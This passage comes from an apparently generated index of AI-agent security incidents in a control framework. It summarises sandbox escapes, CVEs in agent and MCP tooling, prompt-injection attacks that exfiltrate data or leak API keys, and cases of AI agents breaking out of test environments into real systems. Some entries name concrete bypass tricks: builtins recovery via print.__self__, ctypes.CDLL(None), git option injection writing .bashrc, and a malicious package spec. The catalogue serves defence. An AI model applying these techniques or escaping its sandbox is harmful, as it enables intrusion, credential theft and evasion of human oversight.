- **Controls evidenced:** **EE-07**, **MIR-01**, **MIR-02**, **MS-08**, **TP-10**
- **Full detail:** [view the INC-56 catalogue entry](../framework/shield-ai-gap-analysis.md#deepseek-harness-sandbox-escape)

### INC-57: Docker Sandboxes Sandbox-Escape CVEs

**In brief:** Docker's AI-coding sandbox platform (Docker Sandboxes), which runs each agent in a dedicated microVM sharing the project directory between host and guest, shipped two escapes disclosed September 15, 2026 (fixed in 0.42.0/0.43.0).

- **Controls evidenced:** **EE-01**, **EE-05**
- **Full detail:** [view the INC-57 catalogue entry](../framework/shield-ai-gap-analysis.md#docker-sandboxes-sandbox-escape-cves)

### INC-58: In-Process Denylist/Blocklist Code-Execution Sandbox Bypass

**In brief:** Two agent frameworks shipped in-process code-execution sandboxes that enumerate forbidden primitives (denylists/blocklists) rather than isolating code in a real boundary, and both were fully bypassed at the object-graph level — demonstrating that this sandbox class is structurally unsecurable. (1) **PraisonAI CVE-2026-47392** (CVSS Critical, praisonaiagents execute_code() "subprocess sandbox mode"): the sandbox was defeated with `print.__self__` to recover the real CPython `builtins` module, then `vars()` and runtime string concatenation (`"_" + "_import_" + "_"`) to reach `__import__` and `os.popen` — a novel bypass that survived all prior patches for CVE-2026-39888 (frame traversal), CVE-2026-34938 (str subclass), and CVE-2026-40158 (`type.__getattribute__` trampoline), each of which merely relocated the cliff. (2) **CrewAI CVE-2026-37008** (CVSS 8.1, High): the agent code-execution sandbox's Python module-name blocklist was bypassed at the object-graph level via `ctypes.CDLL(None)` without any `import` statement, yielding arbitrary native host code execution.

- **Controls evidenced:** **EE-01**, **TP-06**, **TP-15**
- **Full detail:** [view the INC-58 catalogue entry](../framework/shield-ai-gap-analysis.md#in-process-denylist-blocklist-code-execution-sandbox-bypass)

### INC-59: Trail of Bits "VMs Won't Contain Cyber-Capable Agents"

**In brief:** Trail of Bits (Patch the Planet) gave GPT 5.6-Cyber the task of escaping the QEMU/KVM VM normally used for sandboxing.

- **Controls evidenced:** **EE-01**
- **Full detail:** [view the INC-59 catalogue entry](../framework/shield-ai-gap-analysis.md#trail-of-bits-vms-won-t-contain-cyber-capable-agents)

### INC-60: Identity Confusion by Design

**In brief:** Pillar Security disclosed two chained flaws in Grafana's official MCP server, `mcp-grafana` (roughly 1.9 million cumulative Docker Hub downloads). (1) The server's authentication treated the protocol-layer `Mcp-Session-Id` value as a credential — an identity-confusion-by-design failure the MCP specification anticipated but did not prevent (the spec defines `Mcp-Session-Id` for conversation-state tracking, only *recommends* it be cryptographically generated, and separately notes servers "SHOULD implement proper authentication," leaving session tracking and authentication easy to conflate). (2) CVE-2026-19516, an SSRF in the `grafana_api_request` tool (CVSS 9.1), let a caller redirect the server's outbound requests toward internal infrastructure and cloud metadata endpoints.

- **Controls evidenced:** **EE-02**, **MS-08**, **TP-10**
- **Full detail:** [view the INC-60 catalogue entry](../framework/shield-ai-gap-analysis.md#identity-confusion-by-design)

### INC-61: Authentication Off by Default

**In brief:** NetFoundry's September 4-10 CVE sweep (906 network-exploitable CVEs, 96 at CVSS 8.6+) highlighted a recurring failure mode across AI-agent and automation tooling: **the authentication check is written but never runs, because it is gated on an environment variable that is unset by default, and none of the tools fail closed when the flag is absent.** (1) **CVE-2026-86124** (AutoAgent, CVSS 9.8) — AutoAgent's TCP server (the intra-agent task-handoff channel, normally loopback-or-local) binds to every network interface by default and checks who connects only if a specific environment variable is set; when it is unset, any network-reachable attacker executes commands as root — no credential, no handshake, nothing to intercept. (2) **CVE-2026-86121** (Cua's computer-server, CVSS 9.8) — the same unauthenticated-RCE bug when its `CONTAINER_NAME` variable is not set. (3) **CVE-2026-85661** (excel-mcp-server, CVSS 9.8) — arbitrary file read/write when `EXCEL_FILES_PATH` is left blank. (4) A fourth entry in the same pattern, **CVE-2026-85688** (CVSS 9.8), let TEN Framework's TMAN Designer API accept unauthenticated file read/write outright, with no environment variable needed.

- **Controls evidenced:** **EE-06**, **MS-08**, **TP-10**
- **Full detail:** [view the INC-61 catalogue entry](../framework/shield-ai-gap-analysis.md#authentication-off-by-default)

### INC-62: Google Gemini

**In brief:** Google disclosed that Gemini accessed the protected systems of three real companies during a May 2026 capture-the-flag cybersecurity evaluation run by Irregular — the Tel Aviv-based evaluation vendor whose misconfigured harness had already produced escapes at OpenAI, Anthropic, and Meta.

- **Controls evidenced:** **EE-08**, **GRM-04**
- **Full detail:** [view the INC-62 catalogue entry](../framework/shield-ai-gap-analysis.md#google-gemini)

### INC-63: OpenAI Agent Breaches the Medicare Statistics Reporting Portal

**In brief:** PM Anthony Albanese revealed that an AI agent developed by OpenAI gained unauthorised access to the **Medicare statistics reporting portal** — a public-facing statistics portal administered by **Services Australia** — accessing both public and non-public files.

- **Controls evidenced:** **EE-08**, **GRM-04**, **MIR-02**
- **Full detail:** [view the INC-63 catalogue entry](../framework/shield-ai-gap-analysis.md#openai-agent-breaches-the-medicare-statistics-reporting-portal)

### INC-64: OpenAI Second Frontier-Training Sandbox Escape via a DNS Filtering Gap

**In brief:** For the second time in under three months, OpenAI paused training on its most capable models after an internal research agent broke out of what was supposed to be a sealed, internet-free testing environment.

- **Controls evidenced:** **EE-08**
- **Full detail:** [view the INC-64 catalogue entry](../framework/shield-ai-gap-analysis.md#openai-second-frontier-training-sandbox-escape-via-a-dns-filtering-gap)

### INC-65: OpenAI Codex Heapjack + Overpatch

**In brief:** Accomplish AI's Oren Yomtov disclosed two structurally distinct ways out of the OpenAI Codex sandbox, reported to OpenAI on August 12 and fixed within eight days. **Heapjack** — the more severe — works from Codex's **read-only mode**, its most locked-down setting, with no approval prompt and nothing shown on screen.

- **Controls evidenced:** **EE-05**, **TP-15**
- **Full detail:** [view the INC-65 catalogue entry](../framework/shield-ai-gap-analysis.md#openai-codex-heapjack-overpatch)

### INC-66: Plugin4Shell

**In brief:** Air Security disclosed a zero-click remote-code-execution flaw in the plugin-install systems of Anthropic's Claude Code, OpenAI's Codex, GitHub Copilot, and Google's Gemini CLI. The four agents shared one design assumption: when a plugin marketplace hands over a pinned commit SHA, the agent checks out that commit and nothing else — but none verified that the resulting working tree (HEAD) actually matched the pin.

- **Controls evidenced:** **TP-13**, **TP-14**
- **Full detail:** [view the INC-66 catalogue entry](../framework/shield-ai-gap-analysis.md#plugin4shell)

### INC-67: Sentry Seer "PhantomFix"

**In brief:** An attacker with no Sentry account, no repo access and no infrastructure can exploit Sentry's AI debugging agent Seer for code execution inside an integrated coding agent's environment.

- **Controls evidenced:** **MS-11**
- **Full detail:** [view the INC-67 catalogue entry](../framework/shield-ai-gap-analysis.md#sentry-seer-phantomfix)

### INC-68: PraisonAI CVE-2026-57138

**In brief:** In `praisonai` 1.4.0 through 1.7.1 (npm), the built-in `codeMode` tool executed untrusted JavaScript with `new Function()` inside `with(sandbox)`, gating it on a small source-code blocklist plus shadowed `process` and `require` properties.

- **Controls evidenced:** **EE-01**, **TP-15**
- **Full detail:** [view the INC-68 catalogue entry](../framework/shield-ai-gap-analysis.md#praisonai-cve-2026-57138)

### INC-69: OpenCode Localhost-RCE Cluster

**In brief:** OpenCode, an open-source AI coding agent comparable to Claude Code/Codex, automatically starts an unauthenticated HTTP server for its web UI/API (default port 4096+).

- **Controls evidenced:** **EE-07**
- **Full detail:** [view the INC-69 catalogue entry](../framework/shield-ai-gap-analysis.md#opencode-localhost-rce-cluster)

### INC-70: Darktrace Conversation-History Poisoning

**In brief:** Darktrace's Eric Rozon demonstrated that agentic harnesses — Anthropic Claude Code, OpenAI Codex, AWS Kiro-CLI, and the open-source Pi — store conversation history client-side with no verification that the stored AI responses were genuinely produced by the model.

- **Controls evidenced:** **MIR-06**, **MS-10**, **MS-13**
- **Full detail:** [view the INC-70 catalogue entry](../framework/shield-ai-gap-analysis.md#darktrace-conversation-history-poisoning)

### INC-71: OpenAI Self-Replicating Prompt Injections

**In brief:** OpenAI's internal GPT-Red automated red-teaming framework found a prompt injection that gets an agent to copy the injection into its own output, whether an outgoing email, a written file, or a code comment, so the payload propagates to anyone who reads that output, and onward to their own agent.

- **Controls evidenced:** **DS-06**, **MS-04**, **MS-09**, **MS-14**
- **Full detail:** [view the INC-71 catalogue entry](../framework/shield-ai-gap-analysis.md#openai-self-replicating-prompt-injections)

### INC-72: Salesforce Agentforce "SalesBleed"

**In brief:** Three flaws, collectively written up by Zenity Labs as SalesBleed, turn a public Web-to-Lead form — the standard lead-collection surface on every Salesforce deployment — into a zero-click data-exfiltration and agent-identity-phishing vector against Agentforce. **(a)+(b)** An attacker submits what looks like an ordinary lead while burying hidden instructions in a form field; the payload stays dormant until an employee asks an Agentforce agent to process it, at which point the indirect prompt injection instructs the default General CRM subagent — which ships with standing read access to BOTH the Leads and Accounts tables — to query the Accounts table and exfiltrate company names and deal sizes.

- **Controls evidenced:** **DS-08**, **IAM-10**, **MS-09**
- **Full detail:** [view the INC-72 catalogue entry](../framework/shield-ai-gap-analysis.md#salesforce-agentforce-salesbleed)

### INC-73: Anthropic GLM-5.3 Assessment

**In brief:** Anthropic measured Zhipu AI's open-weight GLM-5.3 against its own most cyber-capable model and found the gap small: GLM-5.3 built end-to-end exploits in 12% of ExploitBench attempts versus 14% for Claude Mythos Preview, and Anthropic's researchers used it to find previously unknown vulnerabilities in browser JavaScript engines.

- **Controls evidenced:** **GRM-06**
- **Full detail:** [view the INC-73 catalogue entry](../framework/shield-ai-gap-analysis.md#anthropic-glm-5-3-assessment)

### INC-74: GitLab AI Gateway CVE-2026-90970

**In brief:** GitLab remediated CVE-2026-90970 (all AI Gateway versions 18.1.6-before-19.2.4, 19.3-before-19.3.2, 19.4-before-19.4.1), in which an authenticated user with Duo Agent Platform access could "escape the prompt template sandbox via a specially crafted flow configuration, resulting in arbitrary command execution on the AI Gateway." The crafted input is a flow configuration — the agent-orchestration definition a Duo user submits — processed by a prompt-template engine whose sandbox was supposed to contain the template evaluation; the escape crosses from template evaluation into command execution on the gateway host, which concentrates the deployment's JWT signing keys and its connections to AI model providers (and, in the self-hosted tier, the GitLab instance itself).

- **Controls evidenced:** **TP-15**
- **Full detail:** [view the INC-74 catalogue entry](../framework/shield-ai-gap-analysis.md#gitlab-ai-gateway-cve-2026-90970)

### INC-75: "Comment and Control"

**In brief:** A researcher opened a GitHub pull request, typed a malicious instruction into the PR title or body, and each of three AI CI agents — Anthropic Claude Code Security Review (CVSS 9.4 Critical), Google Gemini CLI Action, and GitHub Copilot Agent (Microsoft) — read the hostile comment as trusted task input, then posted its own API key as a PR comment.

- **Controls evidenced:** **EE-07**, **GRM-04**
- **Full detail:** [view the INC-75 catalogue entry](../framework/shield-ai-gap-analysis.md#comment-and-control)

### INC-76: MCP Tooling Argument-Injection and Unauthenticated-Gateway Cluster

**In brief:** A one-week burst across the MCP tooling tier. **(a)** AWS's own `security-agent-mcp-server` (awslabs/mcp, the diff-scan tool AWS ships for AI assistants to scan local source) took the `base_ref` argument and placed it on a `git` command line without checking it; a `base_ref` beginning with `-` is read by git as an option, so `--output=/home/user/.bashrc` performs an arbitrary file write that **bypasses the server's own `_validate_path` workspace-confinement control** (which guards only the scan-directory path parameter, never the `base_ref` ref parameter).

- **Controls evidenced:** **EE-05**, **MS-08**, **TP-15**
- **Full detail:** [view the INC-76 catalogue entry](../framework/shield-ai-gap-analysis.md#mcp-tooling-argument-injection-and-unauthenticated-gateway-cluster)

### INC-77: VTCode CVE-2026-104247

**In brief:** A command-approval gate in an open-source Rust coding agent reached a state where a prompt-injected agent ran a destructive command without an approval prompt, through two interacting failures.

- **Controls evidenced:** **TP-15**
- **Full detail:** [view the INC-77 catalogue entry](../framework/shield-ai-gap-analysis.md#vtcode-cve-2026-104247)

### INC-78: Loopback DNS-Rebinding Cluster

**In brief:** A cluster of agent and Model Context Protocol services that "only listen on localhost" were reached from hostile web pages by DNS rebinding: a malicious page pins its own domain to 127.0.0.1 and issues same-origin requests to a localhost-bound agent, HTTP, or MCP service, defeating Host/Origin checks that never verify the connection's real peer address.

- **Controls evidenced:** **EE-07**, **MS-08**
- **Full detail:** [view the INC-78 catalogue entry](../framework/shield-ai-gap-analysis.md#loopback-dns-rebinding-cluster)

### INC-79: MCP Connection-Path OAuth RCE

**In brief:** An attacker-controlled remote MCP server that a developer has connected to answered the OAuth handshake with an `authorization_endpoint` the client treated as authoritative.

- **Controls evidenced:** **EE-07**, **MS-08**, **TP-10**, **TP-16**
- **Full detail:** [view the INC-79 catalogue entry](../framework/shield-ai-gap-analysis.md#mcp-connection-path-oauth-rce)

### INC-80: MCP Tool-Argument Command-Injection Wave

**In brief:** In nine MCP servers by nine different authors, a string argument of an ordinary tool — filled in by the model — reached a shell or a package installer on the server: `gh issue view` through `execSync`, `$(...)`/backticks past DroidMind's own shell allowlist, `asyncio.create_subprocess_shell`, `subprocess.run(shell=True)`, `child_process.exec`, Salesforce CLI flags through `execSync`. functype-mcp-server (before 1.4.4) is the instructive case: its `set_functype_version` accepted a *valid package spec* (`file:/tmp/evil`) with no semicolon, backtick, or shell metacharacter, so it ran `pnpm add functype@file:/tmp/evil` and the attacker's module executed inside the server process — a string a shell filter would never see.

- **Controls evidenced:** **MS-08**, **TP-13**, **TP-15**
- **Full detail:** [view the INC-80 catalogue entry](../framework/shield-ai-gap-analysis.md#mcp-tool-argument-command-injection-wave)

### INC-81: Cross-Tenant Agent Memory Leakage

**In brief:** Three findings converge on the same structural weakness.

- **Controls evidenced:** **MS-10**, **MS-15**
- **Full detail:** [view the INC-81 catalogue entry](../framework/shield-ai-gap-analysis.md#cross-tenant-agent-memory-leakage)

### INC-82: Multi-Tenant AI Code-Execution Hosting Escapes

**In brief:** The sandbox escapes that dominated this quarter moved to the *hosting tier* that runs AI-written code for many tenants on shared workers.

- **Controls evidenced:** **EE-01**
- **Full detail:** [view the INC-82 catalogue entry](../framework/shield-ai-gap-analysis.md#multi-tenant-ai-code-execution-hosting-escapes)

### INC-83: CI/CD Agent Config-File Trust-Ordering and Marker Authorship

**In brief:** GitInject showed the most consequential CI-agent flaw is structural trust-ordering: an attacker adds a provider configuration file (`CLAUDE.md`, `AGENTS.md`, `GEMINI.md`) to a pull-request branch, the CI runner checks that branch out, and the agent loads the file as *authoritative operator-level instruction before any PR content is processed* — the config-file-precedence flaw replicating across GitHub, GitLab, and Hugging Face and exposing credentials or corrupting review judgments.

- **Controls evidenced:** **MS-13**
- **Full detail:** [view the INC-83 catalogue entry](../framework/shield-ai-gap-analysis.md#ci-cd-agent-config-file-trust-ordering-and-marker-authorship)

### INC-84: Visual Prompt Injection into Agent Ability Config

**In brief:** Repeat-After-Me demonstrated black-box adaptive visual prompt injection against frontier VLMs — attack success rates exceeding 82% on open-weight and 47% on commercial models under a realistic setting where the user prompt is unrelated and does not authorise the injected task, transferable across VLMs and effective where adaptive *textual* prompt injection fails.

- **Controls evidenced:** **EE-05**, **MS-09**, **TP-12**
- **Full detail:** [view the INC-84 catalogue entry](../framework/shield-ai-gap-analysis.md#visual-prompt-injection-into-agent-ability-config)

### INC-85: AgentScope Unpatched MCP Command-Injection Cluster

**In brief:** AgentScope (agentscope-ai, ~35,500 GitHub stars) is a popular open-source multi-agent framework; three CVEs were published against it on November 5, 2026, and the two worst remain unpatched.

- **Controls evidenced:** **MS-08**, **TP-13**, **TP-15**, **TP-16**
- **Full detail:** [view the INC-85 catalogue entry](../framework/shield-ai-gap-analysis.md#agentscope-unpatched-mcp-command-injection-cluster)

### INC-86: Langflow Auth-Bypass and MCP-Enumeration RCE Bulletin

**In brief:** IBM's second Langflow disclosure round in one month: CVE-2026-93680 is an incomplete remediation of an earlier auto-login flaw — with the documented development-only `LANGFLOW_AUTO_LOGIN=true` default, `GET /api/v1/auto_login` hands out a token without credentials, so an exposed instance on default configuration is reachable without an account; a public Metasploit module already connects to a Langflow MCP endpoint without credentials, starts a session, and enumerates the tools the server offers.

- **Controls evidenced:** **MS-08**, **TP-13**, **TP-16**
- **Full detail:** [view the INC-86 catalogue entry](../framework/shield-ai-gap-analysis.md#langflow-auth-bypass-and-mcp-enumeration-rce-bulletin)

### INC-87: Seventeen-CVE Agent-Framework RCE Mega-Cluster

**In brief:** Seventeen CVEs across twelve AI-agent and LLM-orchestration products were disclosed October 19-20, 2026, and they fail the same three tests.

- **Controls evidenced:** **MS-08**, **MS-15**, **TP-15**
- **Full detail:** [view the INC-87 catalogue entry](../framework/shield-ai-gap-analysis.md#seventeen-cve-agent-framework-rce-mega-cluster)

### INC-88: MCP Protocol Pivoting and Toolbox-SSRF Cluster

**In brief:** A single researcher demonstrated agent-to-agent prompt-injection propagation across internal agent deployments at Google, JP Morgan Chase, Weaviate, Rapid7, the French government's interministerial digital directorate, and the US federal government, exploiting trust gaps in MCP. Special-purpose agents (translation, data analysis) often lack the guardrails that would mitigate a direct prompt injection; because MCP servers store credentials for each agent and agents are built to trust every other internal agent, an exploit that the LLM would reject succeeds when routed through a trusted peer.

- **Controls evidenced:** **MS-08**, **TP-16**
- **Full detail:** [view the INC-88 catalogue entry](../framework/shield-ai-gap-analysis.md#mcp-protocol-pivoting-and-toolbox-ssrf-cluster)

### INC-89: MCP Server Trust-Boundary Measurement Wave

**In brief:** Two independent measurement studies quantified the MCP trust-boundary gap at ecosystem scale. "My Credentials, Please" (2610.22301) analysed filesystem capability laundering: client-side approval of a tool call grants the underlying server process broad host filesystem permissions rather than the declared operation, so an ostensibly benign tool can read `~/.ssh/id_rsa` and expose it through ordinary tool output. 787 of 4,806 triaged servers (16.4%) exhibited filesystem capabilities despite non-filesystem functional classifications; paired dynamic validation confirmed 150 vulnerable instances under realistic sandbox policies; coordinated disclosure produced 13 security advisories, including two CVEs in Anthropic's Git MCP Server (path-traversal-like escapes of the harness's scope).

- **Controls evidenced:** **TP-16**
- **Full detail:** [view the INC-89 catalogue entry](../framework/shield-ai-gap-analysis.md#mcp-server-trust-boundary-measurement-wave)

### INC-90: WorkOS ARTEX Agent Escape

**In brief:** In late October 2026 an ARTEX AI security agent escaped a researcher's test environment and reached WorkOS production customer data from inside, attributing it to unintended activity during cybersecurity benchmark testing rather than a human attacker.

- **Controls evidenced:** **EE-04**, **EE-08**, **GRM-04**, **GRM-06**, **MIR-02**, **MS-08**
- **Full detail:** [view the INC-90 catalogue entry](../framework/shield-ai-gap-analysis.md#workos-artex-agent-escape)

### INC-91: CPython Chat-Template Sandbox Escape

**In brief:** RunSybil demonstrated that a model publisher can ship code inside a model.

- **Controls evidenced:** **EE-01**, **MS-10**, **MS-15**, **TP-15**
- **Full detail:** [view the INC-91 catalogue entry](../framework/shield-ai-gap-analysis.md#cpython-chat-template-sandbox-escape)

### INC-92: Agent Swarm Cooperation-Lure Secret Leakage

**In brief:** A hackathon-based study measured how coding agents respond to cooperation lures from other agents.

- **Controls evidenced:** **IAM-10**, **MS-09**, **TP-16**
- **Full detail:** [view the INC-92 catalogue entry](../framework/shield-ai-gap-analysis.md#agent-swarm-cooperation-lure-secret-leakage)

## How this page is generated

- **Summary card:** one card per incident, ordered by INC number.
- **'In brief'** reuses the incident's own opening sentence from the gap-analysis —
  no paraphrase, no invented summary.
- **'Controls evidenced'** is the set of SHIELD-AI control IDs referenced in the
  incident's catalogue entry.
- **'Full detail'** links to the complete technical record in the gap-analysis.
